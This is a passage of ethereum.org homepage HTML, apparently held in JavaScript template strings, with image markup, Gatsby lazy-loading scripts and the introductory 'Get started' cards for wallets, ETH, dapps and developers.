                        srcSet="https://d33wubrfki0l68.cloudfront.net/18532ee23bf6cd0d5f5499d5a09ca06c6fd18b71/5488f/static/28214bb68eb5445dcb063a72535bc90c/6e47a/hero.png 750w,https://d33wubrfki0l68.cloudfront.net/65300bdfae2e28241366854cf3646707466b7303/fd7d8/static/28214bb68eb5445dcb063a72535bc90c/28f74/hero.png 1080w,https://d33wubrfki0l68.cloudfront.net/45fc0ca940068b4a1fc7ecb4de4d2c704532b5df/e00ec/static/28214bb68eb5445dcb063a72535bc90c/8b044/hero.png 1366w,https://d33wubrfki0l68.cloudfront.net/3882494c568f561159774f89d0c3fcece4493721/b7fd4/static/28214bb68eb5445dcb063a72535bc90c/f51a3/hero.png 1920w"
                        alt="An illustration of a futuristic city, representing the Ethereum ecosystem." />
                    </picture><noscript>
                      
                    </noscript>
                    <script
                      type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                  </div><a class="Link__InternalLink-sc-e3riao-1 hoRTos Morpher__NavLink-sc-xfsyy9-0 hNHXsg"
                    href="/en/languages/"><span>Ethereum</span></a>
                  <header class="pages__Header-sc-179z7qu-4 iTVOax">
                    <h1 class="pages__H1-sc-179z7qu-2 kaFawG"><span>Welcome to Ethereum</span></h1>
                    <p class="pages__Description-sc-179z7qu-13 hIfFRV"><span>Ethereum is the community-run technology
                        powering the cryptocurrency ether (ETH) and thousands of decentralized applications.</span></p>`;
                      
  const temptext2 = `
                    </header>
                    <div
                      class="SharedStyledComponents__GrayContainer-sc-1cr9zfr-8 pages__StyledGrayContainer-sc-179z7qu-14 iRRQao iBaFdM">
                      <div
                        class="SharedStyledComponents__Content-sc-1cr9zfr-3 pages__StyledContent-sc-179z7qu-1 dedPKg bCrDps">
                        <div class="pages__IntroRow-sc-179z7qu-9 cHKWg">
                          <div
                            class="SharedStyledComponents__LeftColumn-sc-1cr9zfr-5 pages__IntroLeftColumn-sc-179z7qu-28 bcCiek cDElfY">
                            <h2 class="pages__H2-sc-179z7qu-30 eYfbOD"><span>Get started</span></h2>
                            <div class="pages__Subtitle-sc-179z7qu-20 cDXHGL"><span>ethereum.org is your portal into the
                                world of Ethereum. The tech is new and ever-evolving – it helps to have a guide. Here's what
                                we recommend you do if you want to dive in.</span></div>
                          </div>
                          <div class="pages__ImageContainer-sc-179z7qu-12 bCskZk">
                            <div data-gatsby-image-wrapper=""
                              class="gatsby-image-wrapper pages__IntroImage-sc-179z7qu-18 gMJurh">
                              <div aria-hidden="true" style="padding-top:66.61458333333333%"></div><img aria-hidden="true"
                                data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async"
                                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAD2EAAA9hAHVrK90AAAEDUlEQVQ4yzXUa0yadxQG8AMucR+WLFuyJV2XJu2Wrt3UrmvTWtd6m2itRauo3ATk8oIvAgL1VqiiiBcmqKCoRUEQsVrEuxtemGZutdFubku72c3GNG7JLkmdafZBBf7DJTvJ8/WX8+QkByA88ckMQAhB4oWThIRzb0PalXNvfnwhhvl+dPRbF8/HgCTtKGwu9QP6+ydoqSkC0qUjQEk7Ddmkk1BwIwYyk08AOelE2FgFkOqm/sPeCMMV+s8iyPGx8EncmVlywhmUefkDD+n0S8BOOnb82fJg1A+LI2SlkKImJ7+nyE3/EMsmRbGo1z86Sk4+FQZPERDaAEjJKQbXCoJS7RABr50Js9GRtPSL31XRziJFZtTq1Ug40qli/L5+fwb99mQFTQ50oroKGTJobqIGlQz1mRs8Ue8eh5cJRMKKbwhApHJDkeoeEVPdA6zcfoMtsf1cKeLtNzHeQXhu+p6yssNUI8rYpooMqG9g8sA/4d8fvfsosDi9vjfl2UA9Xf7Fw4aHMerqAXCNF2jFrZCYznulwfX0T3ndLBLw1MGy/NgQM78YSXVfhpRlquc8mQvN3/81ODM8Gxy2/4KWJx8Hpoe30Z2OlYX/QX1tA4Cu7wmxzr4B1V3fnjePvdhXaOeDbMwY0lgfIWWlLSAvr0eYSoWYxaagd241NOPyB51NfyFv2x8Br+k56tGv+HZnw+AWguaaZgBZoy9C0bwA8sa5dNw0gWhiU4iNWUJVxpngoCoV3cITHjOkki2Box+5f1wLzrvdwV79SMhlHA/0GyaQVd+9doUDEUw5gKGmHCAWY0CqRgrxGPPVTINm92pdLZIrBcHesmsHmttNiFuoreazyOUkrhCZHM69VZ8j4POYg/4xy344yNlRvSPlMl5XCFhhUE6Asw+MIGlyEgVGC+RaDNNkowFRONlIKq37B1P791IoquFPrc3rC95+9HB+PLQ0OoDutpvRSHcnaqlSIbel5XNBBh/k2aUEj60VgMu/TeBwdZCRSH6NySvKy2Lyq2KTOILr1IqOUrWt+1IK22E0GyZ3Npe/3vxmdnHc3uWyGfQ3e/T6HKNahXfV18c5W5rB09VOPDwMsAQGYPINMXyxeReXtiGh5M4BR+F4mkMvqqfShP6eNgsatZt2qhUY0qtlB0aNYldXjm/JCqmua4lxx6okEtAqpcQpuxV8I+ENBTIHsPBejCtxLnLEPV8U4DYLXTuIURLEsPT9Nrx49kDiG7K6C3MyvTgjb6OInvdQzMz/SlxAXRPRc3mCvCwQ0SnEW2IhlPB5AByhEQowE4jkDmi1bgKvZBhYjWNAT8WJ/XOb4Rpb4GpvhJykRCDFX47cWZ4DbQkOxQVUwGgUkLLphJJCBmSRkg/fAvwLhW79p19VhEMAAAAASUVORK5CYII="
                                alt="" />
                              <picture>
                                <img class = 'handsome' type="image/webp"
                                  data-srcset="/static/9a6e158f4ffd1cb5de246a3ecd0d7f86/c5e11/hackathon_transparent.webp 750w,/static/9a6e158f4ffd1cb5de246a3ecd0d7f86/c34ed/hackathon_transparent.webp 1080w,/static/9a6e158f4ffd1cb5de246a3ecd0d7f86/ca74b/hackathon_transparent.webp 1366w,/static/9a6e158f4ffd1cb5de246a3ecd0d7f86/b3831/hackathon_transparent.webp 1920w"
                                  sizes="100vw" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                  sizes="100vw" decoding="async" loading="lazy"
                                  src="https://d33wubrfki0l68.cloudfront.net/977822b5eda4cdd58d8d6db7ee698131126105fd/68678/static/9a6e158f4ffd1cb5de246a3ecd0d7f86/d7270/hackathon_transparent.png"
                                  data-srcset="https://d33wubrfki0l68.cloudfront.net/3eb04e993798136384d2d828cf203447ae5ca437/33142/static/9a6e158f4ffd1cb5de246a3ecd0d7f86/81032/hackathon_transparent.png 750w,https://d33wubrfki0l68.cloudfront.net/7db30008f200dabdcd3fc0b6f16c94f9be9d3ee7/bed7d/static/9a6e158f4ffd1cb5de246a3ecd0d7f86/d25b8/hackathon_transparent.png 1080w,https://d33wubrfki0l68.cloudfront.net/c16f592c7b229c2047ce22f998a62c34cca11040/14e53/static/9a6e158f4ffd1cb5de246a3ecd0d7f86/b1201/hackathon_transparent.png 1366w,https://d33wubrfki0l68.cloudfront.net/977822b5eda4cdd58d8d6db7ee698131126105fd/68678/static/9a6e158f4ffd1cb5de246a3ecd0d7f86/d7270/hackathon_transparent.png 1920w"
                                  alt="Illustration of a person working on a computer." />
                              </picture>
                              <script
                                type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                            </div>
                          </div>
                        </div>
                        <div
                          class="SharedStyledComponents__CardContainer-sc-1cr9zfr-14 pages__StyledCardContainer-sc-179z7qu-17 eOjDVk kTUIwR">
                          <a class="Link__InternalLink-sc-e3riao-1 hoRTos ActionCard__Card-sc-gy4g5e-6 jZiAML pages__StyledCard-sc-179z7qu-15 gvgshY"
                            href="/en/wallets/find-wallet/">
                            <div class="ActionCard__ImageWrapper-sc-gy4g5e-3 cLArJv action-card-image-wrapper">
                              <div data-gatsby-image-wrapper="" style="width:320px;height:243px"
                                class="gatsby-image-wrapper ActionCard__Image-sc-gy4g5e-5 cIcvKa"><img aria-hidden="true"
                                  data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear"
                                  decoding="async"
                                  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAABYlAAAWJQFJUiTwAAAEFUlEQVQ4y42TW0xTBxzG/y3LzB42k2Vm2cviXraZmEz3sIctW5aFLJlO2UQEYeoc4FRA27gyiwKlpS1QC5RyLR6UQlsol3IdtpWLIIFFUCLGOZjYG+05Pee0lLYQbv2vsodtyRL3Jf+3L798+b78Af5DnWoa+ggv9FXRnG41CQSffHU3WLn6qkXoqmM43Q00dFUy8L+FDxDMN1nOhGEZhprZ129p2XqLdkn1UXUvVyNzg1FNcbR5HmgpJV8Mayv3grsHobMpGGO6HgLz9WCVRMNGWnWB9Ul9WLvxGLd9RBRoLKNeDBwh/NCmoriDtTT8UkHt09f7IvwKBvOV9MawIYx3DAGR/yHCpGWDm8m3Q8J52/Z99aH536DP95ohIcMOiAjKYjcnPzEMRNHSIb1u3nf//hwOW5+siaporGnwVoqGVp77OA0rCAlZTs4xngtShBQk8Zx/Az/da4XYr2dBkDm/Da1vQLBcD+r7m1hT/zwzc3dkGa1NYayTMvE1Bhpiv5zbIY/6En6Yh6QLTk6ywAPJP/+j04/3WCA+5Xc4Y0HYp0T4Rui/crGAHh5sZ0aVhOfxmGkVfx0IjWrH3dnahWe7z0vI1FMyvxHmEfYffgBxP7mfz/kXTJAyAzWFDjiay3K/4C1BHI9KFNayqDA55mQa97pYTqG6yLVWarBPE7MUdsyQcwYr7UxXhPBIDnvteF4QJKpgDKIH4Mrph9BTw8IdIgTV5fRLRWISMvnuWOOwNyyopDBJFMAT8uDW4Qwnnjg3h5UmFssNbofBSI6XEAzyS8iRxM+e7ixLtIFxgIqJLuoFnZSELiXDvaWgoDFz4a1GDTUh0ZJ4UuZbTytbjaSVrWBa+WrkaOrCFi+atsocCCiU5ITBSKGqzoc5RcxM4Rtjr1gmoh32xa3DzQIP5MEQPI2W3NMVmNbeY+mL8sWRtDIWv5ctb56SBjA1Ck04a4uk8e0bj3yraB6hLcIcV/o5sWfC0u3fGOr0TbZOufZA8ycBGGhhuINNLPSV0991t/mwecwbv/PtJ7uOZ1Phk/IgpirDW8lXmcjBI4+2BCUs8kv9z6q0Cx+UGhxwKBqiQEFridssts+SN6BebwNhxRhw3v2Raxzwulsa2b5xDEHWZRJShXbJGTGJ8TzX5sFjv0WyRM6IUE1TSXzngeJWL2RQ06+JO8iKDMUy5hT7775vv70DNL02eOfAJue9xDXI05I6vppBTbtTlF1IEwIN6260Ov+QXnNgQSuFrVOk/0K5j5WqaG/zjcV73W3+gHSAos5e9UtGZfQuQ3v0FZvNDhDluzmiS044vd/+5iU50yGudmGOgsZatW+qlrAl9xChrczKAOaaHN/mFvk1UjWLul4P9rf4dOnpzpcvq8Kgy/CBvpfm/AmiM33gt0e6vwAAAABJRU5ErkJggg=="
                                  alt="" />
                                <picture>
                                  <img class = 'handsome' type="image/webp"
                                    data-srcset="/static/17d9060291d90c60006b558c4267a5fa/b47c9/wallet-cropped.webp 320w,/static/17d9060291d90c60006b558c4267a5fa/d0110/wallet-cropped.webp 640w"
                                    sizes="320px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                    sizes="320px" decoding="async" loading="lazy"
                                    src="https://d33wubrfki0l68.cloudfront.net/78e7d31870d6ed21f34d1740b0b74ecb930e898e/226bb/static/17d9060291d90c60006b558c4267a5fa/11e2e/wallet-cropped.png"
                                    data-srcset="https://d33wubrfki0l68.cloudfront.net/78e7d31870d6ed21f34d1740b0b74ecb930e898e/226bb/static/17d9060291d90c60006b558c4267a5fa/11e2e/wallet-cropped.png 320w,https://d33wubrfki0l68.cloudfront.net/377239975116b22a27e278e2f0bed89271c33e92/c72a7/static/17d9060291d90c60006b558c4267a5fa/5d10b/wallet-cropped.png 640w"
                                    alt="Illustration of a robot with a vault for a body, representing an Ethereum wallet." />
                                </picture>
                                <script
                                  type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                              </div>
                            </div>
                            <div class="ActionCard__Content-sc-gy4g5e-0 fOVdDV action-card-content">
                              <h3 class="ActionCard__Title-sc-gy4g5e-4 gtOVKq">Pick a wallet</h3>
                              <p class="ActionCard__Description-sc-gy4g5e-1 kEexQS">A wallet lets you connect to Ethereum
                                and manage your funds.</p>
                            </div>
                          </a><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos ActionCard__Card-sc-gy4g5e-6 jZiAML pages__StyledCard-sc-179z7qu-15 gvgshY"
                            href="/en/get-eth/">
                            <div class="ActionCard__ImageWrapper-sc-gy4g5e-3 cLArJv action-card-image-wrapper">
                              <div data-gatsby-image-wrapper="" style="width:320px;height:234px"
                                class="gatsby-image-wrapper ActionCard__Image-sc-gy4g5e-5 cIcvKa"><img aria-hidden="true"
                                  data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear"
                                  decoding="async"
                                  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAABcSAAAXEgFnn9JSAAAEqElEQVQ4yx1UeUzTBxj9gDnNlm3Z4o6YLEsW42LMsiExS8ycY9PNTJPN6TzmXGQynA7nGCBe9WKIYEuBrhxllpbeUGhpS/tr6UHBHj/arq0CvcQCKgWkhSIYKKPfYP+95L289+XLy4ODpy7D+Xo+FNVw4XcaC/6g1YL8nzBotS0paEdATzRlXNW/LtYzmLrgiADOJQERU/JzToNGZ0xV6bVpHLUo9cH8QxjFSYBcWgNc4Mrh3G0pnChlwokqHtCbJCmthgqYtj+ARef4uqDGqR4mvOlGkXrFDHAJIWvvITBbSFAaCOB0CqEv6oPQ7BBAZFlwMI8CR2r3wambjDXHbjBefXHDbjBq2W/gPMKcZ/ToZO8DfGTx0e9Ku8FjcW6SMLmcLz7OfIHoNGe0dLTv5eoE6StB5BAJYFoGfPdgWrXaBteb2nmVEpV4hTRYjL6x8OOts12Dqjjhwwmjb3xK6TsadgR+YZTScfvWbdmk0zVgc7qQLZPqFN0eIMhQGhTWSVNPVIjgQCF9+yUGd66GzQw2CWj9klbeI4eFLEwEnixMtXmX4hofxrsGdTYhcYNdXoP1f1YtyOXqxWalGuu5glhOQVnm8YKbAO+9XwofbC57Pq9ccr9BaUCOmL141ytHS1fTSJdUuTQn68MpniM5YwzisNg+X00pW2LTWElnixErqW14iyWOWbs1WMbgYsYnh/fDR5//BFs+PbqnqFKImoFQgrA70EWKZrrVkp1Oert9tM6M0b9tyZjRjyNcS7y9WmRWNCoXm6uakpTzt/FsSYO/lyQCbKEcd36dK4I9Jymw40jelVKRFh1jsQW91YhmfU04/sSxeswUuPLUGsbpFk9iqtmNMfXAgEtGNtraXWiS3Fksvi7Ai5VtWp1SrhBKDZhdWJ8D3MAE/EZVygWuEJoCDxPBES9Gwh39Imvrqsc9oY2ztqFQ3DmEU90hnDUGL+mbyWpjmxdtmvvzHK4dKUxpvsNGasRqK56nahpB9jgBJXLSLvYMomN8ZsHtd6LbymlfinNglNUL06r+byL6exgx+ppOM0iQCUiGsrkPO2RBpDMMY3syv3yrbzhqz79Kx8xdP5b8X9QSuTMgujeM9slnCx1dBLZyr1MUvEvAVV1NQ/+/q4aEtqyHROCdHmICGllWDo8/gK1SP95iaIcq/2r4UNbZi4dzCmOvvf72BgDIeLlY5okIgxE0js6gyUOOevXlBwzCfDB1UNOQnALzsQog5ARkqyufv8XuucNkeWfq2IHE2Zut0wfyL+eW1QoVdVKDW24ZTIctu39Yc5Zrdt9e/mGbfxgFeu2wQni1olzIXLNy/TMyvHrSfP8lfIrPVfGJd0tEesENqq6TUqyIHMuj8TIOH/9K5fL/zFFY/CyJ7jP4rogJ+wppG3OovJMFNexd1WL+jtysrWtHut3rsT/2fdIXrUoGYvxkMEZHf2xvr3JgcwlVv7/oWsuvBZTmdNccAkvUqazlEb3FNO5G2HaIBjuzr8EpKh/OsUVAF3CAdiVreVUwbenexJvoi65P+mObMBDbkOyPrsUErrpQZgJGnRmKqXI4c5H2Sg1H9+2ZgvK1LR0e+A/osfgRl2vKNwAAAABJRU5ErkJggg=="
                                  alt="" />
                                <picture>
                                  <img class = 'handsome' type="image/webp"
                                    data-srcset="/static/ddb9a22d53fdaaae70c0a0d94577f2aa/0962a/eth.webp 320w,/static/ddb9a22d53fdaaae70c0a0d94577f2aa/8caed/eth.webp 640w"
                                    sizes="320px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                    sizes="320px" decoding="async" loading="lazy"
                                    src="https://d33wubrfki0l68.cloudfront.net/b3063176078ed7f473ebdab6dbfc3c7c98d7b592/c3b99/static/ddb9a22d53fdaaae70c0a0d94577f2aa/57a3c/eth.png"
                                    data-srcset="https://d33wubrfki0l68.cloudfront.net/b3063176078ed7f473ebdab6dbfc3c7c98d7b592/c3b99/static/ddb9a22d53fdaaae70c0a0d94577f2aa/57a3c/eth.png 320w,https://d33wubrfki0l68.cloudfront.net/8497b943bc9017d7b7cb6ec6f30fec1166f5c75d/a1c96/static/ddb9a22d53fdaaae70c0a0d94577f2aa/f7e06/eth.png 640w"
                                    alt="Illustration of a group of people marvelling at an ether (ETH) glyph in awe." />
                                </picture>
                                <script
                                  type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                              </div>
                            </div>
                            <div class="ActionCard__Content-sc-gy4g5e-0 fOVdDV action-card-content">
                              <h3 class="ActionCard__Title-sc-gy4g5e-4 gtOVKq">Get ETH</h3>
                              <p class="ActionCard__Description-sc-gy4g5e-1 kEexQS">ETH is the currency of Ethereum – you
                                can use it in applications.</p>
                            </div>
                          </a><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos ActionCard__Card-sc-gy4g5e-6 jZiAML pages__StyledCard-sc-179z7qu-15 gvgshY"
                            href="/en/dapps/">
                            <div class="ActionCard__ImageWrapper-sc-gy4g5e-3 cLArJv action-card-image-wrapper">
                              <div data-gatsby-image-wrapper="" style="width:320px;height:229px"
                                class="gatsby-image-wrapper ActionCard__Image-sc-gy4g5e-5 cIcvKa"><img aria-hidden="true"
                                  data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear"
                                  decoding="async"
                                  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAC4jAAAuIwF4pT92AAADxUlEQVQ4y4WSz28idRTAH9DERL2ZNTHxYvbgzWjUP8BkY2Ji1Bg1uptsjDFq3NNmk71o48Fko7urxjWu3bVuW2hpC8wMFIYCM8OP0qFIF2jl11B+SFugUH4MMDAtUOZJe9GL+r289w7v8z4v7wvwj2e/rwPfIgmu2cWngoTnWXFzDaosCyr4WuP8yXmeu+sA9y9O1blzAYhHm5DYap7FdKINQrwFO8n237DLb/CQ42PqWmYX9sLCy7XMflaguA/TpPPNYnBrqRwvaBG7gDjUGG9y/w/0rnah4I+q9mO7kODzTza3t3tt3oNykMNGwI+5jdSn9WQGmglBc+9Lz38DiakazN7fg006pQqRQXDc9T0jHxzI/fQfisAEj0vhBLZ3sp80UlkohoWJ5x6/9u9Ap7kF5HwN9DMHsOWtT2xSaWCJ4sxAkrFSlk50lsNBJt/DUq79PaICcrM/IW/heHWEGx/R8PuPpCowRavI7zhgpjgAt0cCiqgBtyypXZYeWLTSW4zhEDtCCkdjQig1OClVjjHqPYgCJFW3Jkcg0NGJfcqqQcWhmrn4K8xdJcYD1mB20jG+rF2E8NIAkEJgbO2PWX1bdCxLGHXsjJT24VgEFRz0Rm7TPrqXZTN7q/FIkQtCyWIFPKJBd3n6Me1V4gnEMui+GgOdREvtIFtgMzbP+8xdDJiOxo3SaM0qK4lIGwu5YxRiXcVlEEd+g4z+OfFK0mS9IszbyLKB5KuUJVmy0LUs5fwBoy4A3Z2ySvtzGZYfVN9l9J1hwChvBixdOUINkDN1FZpojRhKwnWT1GeXZJnXZzoNC4FFyoYd3o1yyIPDiAcrLOtHzAN47G3o1FEzNqyuGJqKWVv5/CHRa4bGpj6bpPAeGYPeI1wnOxmTSbkeNsewT2pPKtTKsOL2nLR470B6yGOW9jGnh4LpO7vq08QwW32ftXXQSbXQOiPiqq6JHnsH15jeAc/JLWauJjoW8nTM6B91VojRHmnHXXJVkYRkv1fax7gzwp4Bv51MqC697tecFtRC/cUx4JKNbF4n9bXbdkPtbXgFJ/IEd7NGWTC1tIopI4PHe3nMOQPDqt2Bw2IOh/USpt1R/xnwm8kEvPeq9+xfWZcbEPL3gV4RwbRwCHZ6BOxvEUjf0z1dmDNeC03ThqjOlW5nc8qfrnVMWtaVaioXaWQLt8P09gsj5Rjgxhdx+OA1H7xzwQu0SVRveI40dkLUWPR1tXP1RM0vxtSidgq6Rh0cmin47MLKo8yD4PMb8/6LER370qlIv1wAwRc7k/oLU7nwtpVa/FsAAAAASUVORK5CYII="
                                  alt="" />
                                <picture>
                                  <img class = 'handsome' type="image/webp"
                                    data-srcset="/static/5dea0acbc8484c42006d7bbed32fa019/ab960/doge-computer.webp 320w,/static/5dea0acbc8484c42006d7bbed32fa019/d7c56/doge-computer.webp 640w"
                                    sizes="320px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                    sizes="320px" decoding="async" loading="lazy"
                                    src="https://d33wubrfki0l68.cloudfront.net/b18782b08602085a38807e03f3cdfa25036c5539/074bd/static/5dea0acbc8484c42006d7bbed32fa019/7c061/doge-computer.png"
                                    data-srcset="https://d33wubrfki0l68.cloudfront.net/b18782b08602085a38807e03f3cdfa25036c5539/074bd/static/5dea0acbc8484c42006d7bbed32fa019/7c061/doge-computer.png 320w,https://d33wubrfki0l68.cloudfront.net/ccdf1ef02eed0a51217f5dd0093a9ed30a2a90d9/f2b01/static/5dea0acbc8484c42006d7bbed32fa019/3ad27/doge-computer.png 640w"
                                    alt="Illustration of a doge using a computer." />
                                </picture><noscript>
                                  <picture>
                                    <img class = 'handsome' type="image/webp"
                                      srcSet="/static/5dea0acbc8484c42006d7bbed32fa019/ab960/doge-computer.webp 320w,/static/5dea0acbc8484c42006d7bbed32fa019/d7c56/doge-computer.webp 640w"
                                      sizes="320px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                      sizes="320px" decoding="async" loading="lazy"
                                      src="https://d33wubrfki0l68.cloudfront.net/b18782b08602085a38807e03f3cdfa25036c5539/074bd/static/5dea0acbc8484c42006d7bbed32fa019/7c061/doge-computer.png"
                                      srcSet="https://d33wubrfki0l68.cloudfront.net/b18782b08602085a38807e03f3cdfa25036c5539/074bd/static/5dea0acbc8484c42006d7bbed32fa019/7c061/doge-computer.png 320w,https://d33wubrfki0l68.cloudfront.net/ccdf1ef02eed0a51217f5dd0093a9ed30a2a90d9/f2b01/static/5dea0acbc8484c42006d7bbed32fa019/3ad27/doge-computer.png 640w"
                                      alt="Illustration of a doge using a computer." />
                                  </picture>
                                </noscript>
                                <script
                                  type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                              </div>
                            </div>
                            <div class="ActionCard__Content-sc-gy4g5e-0 fOVdDV action-card-content">
                              <h3 class="ActionCard__Title-sc-gy4g5e-4 gtOVKq">Use a dapp</h3>
                              <p class="ActionCard__Description-sc-gy4g5e-1 kEexQS">Dapps are applications powered by
                                Ethereum. See what you can do.</p>
                            </div>
                          </a><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos ActionCard__Card-sc-gy4g5e-6 jZiAML pages__StyledCard-sc-179z7qu-15 gvgshY"
                            href="/en/developers/">
                            <div class="ActionCard__ImageWrapper-sc-gy4g5e-3 cLArJv action-card-image-wrapper">
                              <div data-gatsby-image-wrapper="" style="width:320px;height:229px"
                                class="gatsby-image-wrapper ActionCard__Image-sc-gy4g5e-5 cIcvKa"><img aria-hidden="true"
                                  data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear"
                                  decoding="async"
                                  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAC4jAAAuIwF4pT92AAAD2UlEQVQ4y22Sb0xbVRjGn9sSYmY0mQnJ/IJ+cFuixsXpF52ZibqYmCxBE/1ijOC+jCBmgy1zUKCjwEYLlFEoXVcoA9ryv6V/KPJXA0zImK4sY9PJCm1vb+9tKW0pUBnjeC4mmjjf5OTee3Lu733e5zzAf8pQ7kNPncB01/DoqA6+Z5EFX5AvBZ4rmw/sV86xqLH68HYFC7Kwhc+LQlDMrjD1HAsn4ZCruIOnqq0yAKtmFf1XIzDXhQ6PZXBp2pvBN81O/rvaWyyMyxsMjv8GQgiyzgcz5Te9qPEEGL2fhWqW/X+gjQKd2ihs9QKKC7w4XRDYX1LJfnLfQvbOGKtDsDQIJzUWfr30tu+VKg8L5RQrqZ72Pw3UVYibz+JAWieGXTuSvjmC0nLf0ZzSQLZNyb/RUC+Y8dZIulUn9DVYBFL9Czt9CG1MTvHPqBxfYf4BffjaMM7nLODjIyM4uK8bPzn/TPuhdwNd1yLF3ZrwKVBxV0fZTzuKhAyHUVA0aXlyupxLXXJxRL0QaNAFw7gmxP8Fqku8eP/QEH2T49FdIjFpw9Ar2WP2jjjpb1kbq6p9dPAw8aTbjeESgyFC8qu4nTwFt3tGxe1cnuSJao79Wn2XAz541Y0vT8xgXfjbH/YhkTy4TdDewJ8Y7tkg1rZYf0td8OVj4BnkzKCmlm3PpbB8Jb97VsXv5iuF3bwrwZRswC/76oIXUF1cwqmTsxRVgjHrVrrLso7ORuGboa4kcfckRWBjX+sa1OeW0HrBD833y+/WyP1rhZcCJO9K6HFReYCoildmDcd/f16X9wdwZ4aIPkkeeoi05/oqyr69/xJVFhfVOUyJJB2Z7dJF5Ner2RdHWhM0UpEChyZCblwObtfL/U9oXsmgJrLdrgoeMSnpyL9OEXTrV8F7CVpqOXHMxUl7itg7EylHZ4LQFaKqBWrBF7bOODymbbj0McdIS5y4tNEt2oTYddHCYUMcdE+KqaFtmJrCR+lPtonBFKHfhN4umbCliMu8vuI0Jz7rN0b3DXbE4TLGpWZVCDrZcqbbEAtNtCeJoznqEkMuVqsigL3EO02J+Wn3Y0KjQoZ7kovUN631RqywqcKXMTawCaOaA1XMTA2k4NRFpXYa+t56IYvC/Poy34HuWh69akEiNsOtSSIezh63bt2ztcfOZr0z+Yy7KwmqlloQxOjAppSOy4iNWXr74lNcyUWCZtlyRlsli8GmVWZIH4OtcRXIlHRg3JbakyxCzmV7QH1Mo8qk5uYwMzf+BPM/Eshy76Gl3A9F7iIaL3rxYJRAV7IiKmPc12OYMm/io9fd+AtF9mOcLxTuOAAAAABJRU5ErkJggg=="
                                  alt="" />
                                <picture>
                                  <img class = 'handsome' type="image/webp"
                                    data-srcset="/static/810eb64d89629231aa4d8c7fe5f20ee5/ab960/developers-eth-blocks.webp 320w,/static/810eb64d89629231aa4d8c7fe5f20ee5/d7c56/developers-eth-blocks.webp 640w"
                                    sizes="320px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                    sizes="320px" decoding="async" loading="lazy"
                                    src="https://d33wubrfki0l68.cloudfront.net/02929233f126da019dc082bbe159332ef6b645e6/710a7/static/810eb64d89629231aa4d8c7fe5f20ee5/7c061/developers-eth-blocks.png"
                                    data-srcset="https://d33wubrfki0l68.cloudfront.net/02929233f126da019dc082bbe159332ef6b645e6/710a7/static/810eb64d89629231aa4d8c7fe5f20ee5/7c061/developers-eth-blocks.png 320w,https://d33wubrfki0l68.cloudfront.net/9381a84cf65d4dc02378a321aac51f91907427d1/f7669/static/810eb64d89629231aa4d8c7fe5f20ee5/3ad27/developers-eth-blocks.png 640w"
